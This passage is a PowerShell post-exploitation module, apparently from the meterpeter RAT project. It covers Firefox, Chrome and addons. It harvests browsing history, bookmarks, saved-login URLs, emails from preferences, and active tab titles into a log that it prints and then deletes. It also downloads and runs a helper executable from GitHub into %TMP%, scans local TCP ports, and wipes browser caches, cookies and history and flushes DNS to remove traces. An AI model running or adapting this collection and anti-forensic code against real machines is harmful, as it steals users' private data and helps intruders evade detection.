                echo "$ParsingData" >> $LogFilePath\BrowserEnum.log            
            }
        }else{
            $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.dir','Downloads    '
            If($ParsingData -match '\\\\'){$ParsingData = $ParsingData -replace '\\\\','\'}
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }
    }else{
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log
    }

    ## Get Firefox.exe binary path
    $BinaryPath = Get-Process firefox -ErrorAction SilentlyContinue
    If(-not($BinaryPath) -or $BinaryPath -eq $null){
        echo "BinaryPath   : {requires firefox process running}" >> $LogFilePath\BrowserEnum.log
    }else{
        $BinaryPath = Get-Process firefox|Select -ExpandProperty Path
        $parseData = $BinaryPath[0]
        echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
    }
    ## leak From previous Functions { StartTime|PID }
    echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
    echo "$PSID" >> $LogFilePath\BrowserEnum.log

    ## Get Firefox Last Active Tab windowsTitle
    echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    $checkProcess = Get-Process firefox -ErrorAction SilentlyContinue
    If(-not($checkProcess)){
        echo "{requires firefox process running}`n" >> $LogFilePath\BrowserEnum.log
    }else{
        $StoreData = Get-Process firefox|Select -ExpandProperty MainWindowTitle
        $ParseData = $StoreData | where {$_ -ne ""}
        $MyPSObject = $ParseData -replace '- Mozilla Firefox',''
        echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
    }

    ## leak FIREFOX HISTORY URLs
    # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
    echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
    echo "---------------" >> $LogFilePath\BrowserEnum.log
    If(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"){
        $Profiles = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"
        $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        Get-Content $Profiles\places.sqlite -ErrorAction SilentlyContinue|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
            $Value = New-Object -TypeName PSObject -Property @{
                FireFoxHistoryURL = $_
            }
            if ($Value -match $Search) {
                $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
                echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
            }
        }

    }else{

        If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default")){
            echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log 
        }else{
            $Profiles = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default"
            $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            Get-Content $Profiles\places.sqlite -ErrorAction SilentlyContinue|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
                $Value = New-Object -TypeName PSObject -Property @{
                    FireFoxHistoryURL = $_
                }
                if ($Value -match $Search) {
                    $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
                    echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
                }  
            }
        }
    }

     ## Retrieve FireFox bookmarks
    echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
    echo "-----------------" >> $LogFilePath\BrowserEnum.log
    $IPATH = pwd;$AlternativeDir = $False
    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release")){
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4"   
    }else{
        $AlternativeDir = $True
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\*.jsonlz4" 
    }

    If(-not(Test-Path -Path "$Bookmarks_Path")) {
        echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
    }else{
        If($AlternativeDir -eq $True){
            ## Store last bookmark file into { $Final } local var
            cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\"
            $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarkbackups\*"
            $Final = $StorePath|Select-Object -ExpandProperty name|Select -Last 1
            ## Copy .Jsonlz4 file to $env:tmp directory
            Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
        }else{
            ## Store last bookmark file into { $Final } local var
            cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\"
            $StorePath = dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*"
            $Final = $StorePath|Select-Object -ExpandProperty name|Select -Last 1
            ## Copy .Jsonlz4 file to $env:tmp directory
            Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
        }
    
        If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){

            ## Download mozlz4-win32.exe from meterpeter github repo
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null   

            cd $Env:TMP
            ## Convert from jsonlz4 to json
            .\mozlz4-win32.exe --extract output.jsonlz4 output.json
            $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
            $SplitString = $DumpFileData.split(',')
            $findUri = $SplitString|findstr /I /C:"uri"
            $Deliconuri = $findUri|findstr /V /C:"iconuri"
            $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}','' -replace ']',''
            echo $ParsingData >> $LogFilePath\BrowserEnum.log
            Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
            Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue

            <#
            .SYNOPSIS
               mozlz4-win32.exe Firefox Fail dependencie bypass
            .DESCRIPTION
               I cant use 'ConvertFrom-Json' cmdlet because it gives 'primitive
               JSON invalid error' parsing .jsonlz4 files to TEXT|CSV format ..
            #>

            ## [ deprecated function ]
            # $Json = Get-Content "$Bookmarks_Path" -Raw
            # $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
            #    ForEach ($Key in $Regex){
            #        echo "`n" $Key >> $LogFilePath\BrowserEnum.log
            #    }

        }Else{

            cd $Env:TMP
            ## Convert from jsonlz4 to json
            .\mozlz4-win32.exe --extract output.jsonlz4 output.json
            $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
            $SplitString = $DumpFileData.split(',')
            $findUri = $SplitString|findstr /I /C:"uri"
            $Deliconuri = $findUri|findstr /V /C:"iconuri"
            $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}','' -replace ']',''
            echo $ParsingData >> $LogFilePath\BrowserEnum.log
            Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
            Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue

        }
    }
    cd $IPATH
    If(Test-Path "$Env:TMP\output.jsonlz4"){Remove-Item -Path "$Env:TMP\output.jsonlz4" -Force}
    If(Test-Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}

    ## Retrieve Firefox logins
    echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"))
    {
        If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"))
        {
            echo "{None URL's found}" >> $LogFilePath\BrowserEnum.log
        }else{
            $ReadData = Get-Content "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" 
            $SplitData = $ReadData -split(',')
            $ParseData = $SplitData|findstr /I /C:"http" /I /C:"https"|findstr /V /C:"httpRealm" /V /C:"formSubmitURL"
            $Json = $ParseData -replace '":','' -replace '"','' -replace 'hostname',''
            echo $Json >> $LogFilePath\BrowserEnum.log
        }
    }else{
        $ReadData = Get-Content "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json" 
        $SplitData = $ReadData -split(',')
        $ParseData = $SplitData|findstr /I /C:"http" /I /C:"https"|findstr /V /C:"httpRealm" /V /C:"formSubmitURL"
        $Json = $ParseData -replace '":','' -replace '"','' -replace 'hostname',''
        echo $Json >> $LogFilePath\BrowserEnum.log
    }
}


function CHROME {
    ## Retrieve Google Chrome Browser Information
    echo "`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
    echo "--------------" >> $LogFilePath\BrowserEnum.log
    $Chrome_App = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
    If(-not($Chrome_App) -or $Chrome_App -eq $null){
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log
    }else{
        ## Test if browser its active 
        $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences" -ErrorAction SilentlyContinue
        $CHTestings = (Get-Process Chrome -ErrorAction SilentlyContinue).Responding
        If($CHTestings -eq $True){
            $Status = "Status       : Active"
            ## Get Browser startTime
            $BsT = Get-Process Chrome|Select -ExpandProperty StartTime
            $StartTime = $BsT[0];$FinalOut = "StartTime    : $StartTime"
            $SSID = get-process Chrome|Select -Last 1|Select-Object -Expandproperty Id
            $PSID = "Process PID  : $SSID"
        }else{
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires Chrome process running}"
            $FinalOut = "StartTime    : {requires Chrome process running}"
        }
        echo "$Status" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Browser accept languages
        If($Preferencies_Path){
            $Parse_String = $Preferencies_Path.split(",")
            $Search_Lang = $Parse_String|select-string "accept_languages"
            $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':','    : ' -replace 'accept_languages','Languages'
            If(-not($Parse_Dump) -or $Parse_Dump -eq $null){
                echo "Languages    : {null}" >> $LogFilePath\BrowserEnum.log
            }else{
                echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
            }
        }

        ## Retrieve Browser Version
        $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
        echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Download Folder (default_directory) Settings
        If($Preferencies_Path){
            $Parse_String = $Preferencies_Path.split(",")
            $Download_Dir = $Parse_String|select-string "savefile"
            If(-not($Download_Dir) -or $Download_Dir -eq $null){
                echo "Downloads    : $env:userprofile\Downloads" >> $LogFilePath\BrowserEnum.log
            }else{
                $Parse_Dump = $Download_Dir -replace '"','' -replace '{','' -replace '}','' -replace 'default_directory:','' -replace 'savefile:','Downloads    : '
                If($Parse_Dump -match '\\\\'){$Parse_Dump = $Parse_Dump -replace '\\\\','\'}
                echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
            }
        }

        ## leak Chrome.exe binary path
        $BinaryPath = Get-Process chrome -ErrorAction SilentlyContinue
        If(-not($BinaryPath) -or $BinaryPath -eq $null){
            echo "BinaryPath   : {requires chrome process running}" >> $LogFilePath\BrowserEnum.log
        }else{
            $BinaryPath = Get-Process chrome|Select -ExpandProperty Path
            $parseData = $BinaryPath[0]
            echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
        }
        echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
        echo "$PSID" >> $LogFilePath\BrowserEnum.log

        ## leak Chrome Last Active Tab windowsTitle
        echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
        echo "------------------" >> $LogFilePath\BrowserEnum.log
        $checkTitle = Get-Process chrome -ErrorAction SilentlyContinue
        If(-not($checkTitle)){
            echo "{requires chrome process running}`n" >> $LogFilePath\BrowserEnum.log
        }else{
            $StoreData = Get-Process chrome|Select -ExpandProperty MainWindowTitle
            $ParseData = $StoreData|where {$_ -ne ""}
            $MyPSObject = $ParseData -replace '- Google Chrome',''
            ## Write my PSobject to logfile
            echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
        }

        ## Retrieve Email(s) from Google CHROME preferencies File ..
        If($Preferencies_Path){
            $Parse_String = $Preferencies_Path.split(",")
            $Search_Email = $Parse_String|select-string "email"
            $Parse_Dump = $Search_Email -replace '"','' -replace 'email:',''
            If(-not($Search_Email) -or $Search_Email -eq $null){
                echo "Email            : {None Email's Found}`n" >> $LogFilePath\BrowserEnum.log
            }else{
                ## Build new PSObject to store emails found
                $Store = ForEach ($Email in $Parse_Dump){
                    New-Object -TypeName PSObject -Property @{
                        Emails = $Email
                    }
                }
                ## Write new PSObject to logfile
                echo $Store >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome History
        # Source: https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
        echo "`nChrome History" >> $LogFilePath\BrowserEnum.log
        echo "--------------" >> $LogFilePath\BrowserEnum.log
        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History")){
            echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
            $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
            $Get_Values|ForEach-Object {
                $Key = $_
                if ($Key -match $Search){
                    echo "$_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome bookmarks
        echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
        echo "----------------" >> $LogFilePath\BrowserEnum.log
        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks")) {
            echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
            $Output = ConvertFrom-Json20($Json) ## TODO:
            $Jsonobject = $Output.roots.bookmark_bar.children
            $Jsonobject.url|Sort -Unique|ForEach-Object {
                if ($_ -match $Search) {
                    echo "$_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome URL logins
        echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
        echo "------------------" >> $LogFilePath\BrowserEnum.log
        If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
            echo "{None URL's found}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            $ReadData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
            $Json = Get-Content -Path "$ReadData"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
            echo $Json >> $LogFilePath\BrowserEnum.log
        }
}


function ADDONS {  
    ## Retrieve IE addons
    echo "`n`n[ IE|MSEDGE ]" >> $LogFilePath\BrowserEnum.log
    echo "`nName" >> $LogFilePath\BrowserEnum.log
    echo "----" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings")){
        echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
    }else{
        If(-not(Test-Path HKCR:)){New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT|Out-Null} 
        $Registry_Keys = @( "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\explorer\Browser Helper Objects",
        "HKLM:\Software\Microsoft\Internet Explorer\URLSearchHooks",
        "HKLM:\Software\Microsoft\Internet Explorer\Extensions",
        "HKCU:\Software\Microsoft\Internet Explorer\Extensions" )
        $Registry_Keys|Get-ChildItem -Recurse -ErrorAction SilentlyContinue|Select -ExpandProperty PSChildName |  
            ForEach-Object { 
                If(Test-Path "HKCR:\CLSID\$_"){ 
                    $CLSID = Get-ItemProperty -Path "HKCR:\CLSID\$_" | Select-Object @{n="Name";e="(default)"}
                    $CLSIData = $CLSID -replace '@{Name=','' -replace '}',''
                    echo "$CLSIData" >> $LogFilePath\BrowserEnum.log
                }
            }
    }

    ## Retrieve firefox addons
    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\extensions.json")){
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions.json" # (IEFP)
        If(-not(Test-Path "$Bookmarks_Path")){
            echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions.json" # (IEFP)
            $Json = Get-Content "$Bookmarks_Path" -Raw|ConvertFrom-Json|select *
            $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
        }  
    }else{
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\extensions.json"
        $Json = Get-Content "$Bookmarks_Path" -Raw|ConvertFrom-Json|select *
        $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve Chrome addons
    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -ErrorAction SilentlyContinue)){
        echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw -ErrorAction SilentlyContinue|ConvertFrom-Json|select *
        $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
    }
}
 

 ## Function tcp port scanner
function PORTSCANNER {
[int]$counter = 0

    If(-not($param2)){$PortRange = "21,22,23,25,80,110,135,137,139,443,445,666,1433,3389,8080"}else{$PortRange = $param2}
    $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
    echo "`n`nRemote-Host   Status   Proto  Port" >> $LogFilePath\BrowserEnum.log
    echo "-----------   ------   -----  ----" >> $LogFilePath\BrowserEnum.log
    $PortRange -split(',')|Foreach-Object -Process {
        If((Test-NetConnection $Remote_Host -Port $_ -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){
            echo "$Remote_Host  Open     tcp    $_ *" >> $LogFilePath\BrowserEnum.log
            $counter++
        }else{
            echo "$Remote_Host  Closed   tcp    $_" >> $LogFilePath\BrowserEnum.log
        }
    }
    echo "`nTotal open tcp ports found => $counter" >> $LogFilePath\BrowserEnum.log
}


## Function browser cleaner
function BROWSER_CLEANTRACKS {
[int]$DaysToDelete = 0 # delete all files less than the current date ..

    If($RUIUIUi0 -iMatch '^(yes)$')
    {
       ## Global cleaning
       ipconfig /flushdns|Out-Null
       C:\Windows\System32\rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 1|Out-Null     #  Clear History
       C:\Windows\System32\rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 2|Out-Null     #  Clear Cookies
       C:\Windows\System32\rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 8|Out-Null     #  Clear Temporary Files
       # C:\Windows\System32\rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 255|Out-Null #  Clear cookies, history data, internet files, and passwords
    }


    ## Clean Internet Explorer temporary files
    echo "   [IE|MsEdge Browser]" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Microsoft\Windows\WER\ERC" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Microsoft\Windows\INetCache" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Microsoft\Windows\INetCookies" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Microsoft\Windows\IEDownloadHistory" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Microsoft\Windows\Temporary Internet Files" >> $LogFilePath\BrowserEnum.log
    echo "   ----------------------" >> $LogFilePath\BrowserEnum.log

    ## Common locations
    $TempFiles = "$Env:LOCALAPPDATA\Microsoft\Windows\WER\ERC"
    $InetCache = "$Env:LOCALAPPDATA\Microsoft\Windows\INetCache"
    $Cachecook = "$Env:LOCALAPPDATA\Microsoft\Windows\INetCookies"
    $CacheDown = "$Env:LOCALAPPDATA\Microsoft\Windows\IEDownloadHistory"
    $CacheFile = "$Env:LOCALAPPDATA\Microsoft\Windows\Temporary Internet Files"

    ## Locations Recursive Query
    $RemoveMe = (Get-ChildItem -Path "$CacheFile","$TempFiles","$InetCache","$Cachecook","$CacheDown" -Recurse -EA SilentlyContinue|Where-Object { ($_.CreationTime -lt $(Get-Date).AddDays(-$DaysToDelete)) -and $_.PSIsContainer -eq $false }).FullName

    If(-not([string]::IsNullOrEmpty($RemoveMe)))
    {
       ForEach($Item in $RemoveMe)
       {
          ## Delete selected files
          $NameOnly = (Get-ChildItem -Path "$Item" -EA SilentlyContinue).Name
          echo "   Deleted:: $NameOnly" >> $LogFilePath\BrowserEnum.log
          Remove-Item -Path "$Item" -Force -EA SilentlyContinue
       }
    }
    Else
    {
       echo "   None temp files found." >> $LogFilePath\BrowserEnum.log
    }


    ## Clean Mozilla Firefox temporary files
    echo "`n`n   [FireFox Browser]" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default\cache" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default\cache2\entries" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries" >> $LogFilePath\BrowserEnum.log
    echo "   ----------------------" >> $LogFilePath\BrowserEnum.log

    ## Common locations
    $CacheFile = "$Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default\cache"
    $TempFiles = "$Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache"
    $OutraFile = "$Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default\cache2\entries"
    $IefpFiles = "$Env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries"

    ## Locations Recursive Query
    $RemoveMe = (Get-ChildItem -Path "$CacheFile","$TempFiles","$OutraFile","$IefpFiles" -Recurse -EA SilentlyContinue|Where-Object { ($_.CreationTime -lt $(Get-Date).AddDays(-$DaysToDelete)) -and $_.PSIsContainer -eq $false }).FullName

    If(-not([string]::IsNullOrEmpty($RemoveMe)))
    {
       ForEach($Item in $RemoveMe)
       {
          ## Delete selected files
          $NameOnly = (Get-ChildItem -Path "$Item" -EA SilentlyContinue).Name
          echo "   Deleted:: $NameOnly" >> $LogFilePath\BrowserEnum.log
          Remove-Item -Path "$Item" -Force -EA SilentlyContinue
       }
    }
    Else
    {
       echo "   None temp files found." >> $LogFilePath\BrowserEnum.log
    }


    ## Clean Google Chrome temporary files
    echo "`n`n   [Chrome Browser]" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Google\Chrome\User Data\Default\VisitedLinks" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache2\entries" >> $LogFilePath\BrowserEnum.log
    echo "   ----------------------" >> $LogFilePath\BrowserEnum.log

    ## Common locations
    $CacheFile = "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
    $Cachecook = "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    $Cachehist = "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    $Cachelink = "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\VisitedLinks"
    $TempFiles = "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache2\entries"

    ## Locations Recursive Query
    $RemoveMe = (Get-ChildItem -Path "$CacheFile","$Cachecook","$Cachehist","$Cachelink","$TempFiles" -Recurse -EA SilentlyContinue|Where-Object{ ($_.CreationTime -lt $(Get-Date).AddDays(-$DaysToDelete)) -and $_.PSIsContainer -eq $false }).FullName

    If(-not([string]::IsNullOrEmpty($RemoveMe)))
    {
       ForEach($Item in $RemoveMe)
       {
          ## Delete selected files
          $NameOnly = (Get-ChildItem -Path "$Item" -EA SilentlyContinue).Name
          echo "   Deleted:: $NameOnly" >> $LogFilePath\BrowserEnum.log
          Remove-Item -Path "$Item" -Force -EA SilentlyContinue
       }
    }
    Else
    {
       echo "   None temp files found." >> $LogFilePath\BrowserEnum.log
    }


    ## Clean Opera temporary files
    echo "`n`n   [Opera Browser]" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\Opera Software\Opera GX Stable\Cache\Cache_Data" >> $LogFilePath\BrowserEnum.log
    echo "   ----------------------" >> $LogFilePath\BrowserEnum.log

    ## Common locations
    $OpCache = "$Env:LOCALAPPDATA\Opera Software"
    $OpName = (Get-ChildItem -Path "$OpCache" -Recurse -Force|Where-Object {$_.PSIsContainer -eq $true -and $_.Name -match "^(Cache)$"}).FullName

    ## Locations Recursive Query
    $OpClean = (Get-ChildItem -Path "${OpName}\Cache_Data"|Where-Object {$_.PSIsContainer -eq $false -and $_.Name -ne "index"}).FullName

    If(-not([string]::IsNullOrEmpty($OpClean)))
    {
       ForEach($Item in $OpClean)
       {
          ## Delete selected files
          $NameOnly = (Get-ChildItem -Path "$Item" -EA SilentlyContinue).Name
          echo "   Deleted:: $NameOnly" >> $LogFilePath\BrowserEnum.log
          Remove-Item -Path "$Item" -Force -EA SilentlyContinue
       }
    }
    Else
    {
       echo "   None temp files found." >> $LogFilePath\BrowserEnum.log
    }


    ## Clean Brave temporary files
    echo "`n`n   [Brave Browser]" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\BraveSoftware\User Data\Default\Cache" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\BraveSoftware\Brave-Browser\UserData\Default" >> $LogFilePath\BrowserEnum.log
    echo "   $Env:LOCALAPPDATA\BraveSoftware\User Data\Default\Cache\Cache_Data" >> $LogFilePath\BrowserEnum.log
    echo "   ----------------------" >> $LogFilePath\BrowserEnum.log

    ## Common locations
    $OpCache = "$Env:LOCALAPPDATA\BraveSoftware\User Data\Default\Cache"
    $OpUserd = "$Env:LOCALAPPDATA\BraveSoftware\Brave-Browser\UserData\Default"
    $OpDatas = "$Env:LOCALAPPDATA\BraveSoftware\User Data\Default\Cache\Cache_Data"

    ## Locations Recursive Query
    $OpClean = (Get-ChildItem -Path "${OpCache}","${OpDatas}","${OpUserd}"|Where-Object {$_.PSIsContainer -eq $false}).FullName

    If(-not([string]::IsNullOrEmpty($OpClean)))
    {
       ForEach($Item in $OpClean)
       {
          ## Delete selected files
          $NameOnly = (Get-ChildItem -Path "$Item" -EA SilentlyContinue).Name
          echo "   Deleted:: $NameOnly" >> $LogFilePath\BrowserEnum.log
          Remove-Item -Path "$Item" -Force -EA SilentlyContinue
       }
    }
    Else
    {
       echo "   None temp files found." >> $LogFilePath\BrowserEnum.log
    }

}

## Jump Links (Functions)
If($param1 -eq "-IE"){IE_Dump}
If($param1 -eq "-CHROME"){CHROME}
If($param1 -eq "-ADDONS"){ADDONS}
If($param1 -eq "-FIREFOX"){FIREFOX}
If($param1 -eq "-OPERA"){OPERA}
If($param1 -eq "-CREDS"){CREDS_DUMP}
If($param1 -eq "-SCAN"){PORTSCANNER}
If($param1 -eq "-RECON"){BROWSER_RECON}
If($param1 -eq "-CLEAN"){BROWSER_CLEANTRACKS}
If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME;OPERA}

## NOTE: ForEach - Build PSObject displays ..
# $StoreData = ForEach ($Key in $Input_String){
#     New-Object -TypeName PSObject -Property @{
#         Data = $Key
#     } 
# }
# Write-Host $StoreData|Out-File "$env:tmp\report.log"

## Retrieve Remote Info from LogFile
Write-Host ""
Get-Content "$LogFilePath\BrowserEnum.log"
Remove-Item -Path "$LogFilePath\BrowserEnum.log" -Force
Exit
